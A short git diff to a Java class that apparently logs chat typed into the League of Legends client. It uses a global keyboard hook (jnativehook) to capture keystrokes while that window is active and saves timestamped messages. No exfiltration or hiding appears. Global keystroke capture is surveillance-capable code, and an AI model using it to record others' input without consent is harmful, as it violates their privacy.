@@ -6,6 +6,8 @@ import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
 import java.io.IOException;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -27,7 +29,6 @@ public class LolClientLogger extends KeyLogger implements NativeKeyListener {
         if (accessWindow.getActiveWindowTitle().equals(Globals.lolClient)) {
             if(NativeKeyEvent.getKeyText(e.getKeyCode()).equals(sendKey)) {
                 try {
-                    System.out.println(fileName);
                     saveMessage();
                 } catch (IOException e1) {
                     e1.printStackTrace();
@@ -43,6 +44,11 @@ public class LolClientLogger extends KeyLogger implements NativeKeyListener {
                 }
             }
         }
+    }
+
+    @Override
+    void setDefaults() {
+        super.message = "From: LoL-Client || At: " + getCurrentTime() + "|| Message: ";
     }
 
     @Override
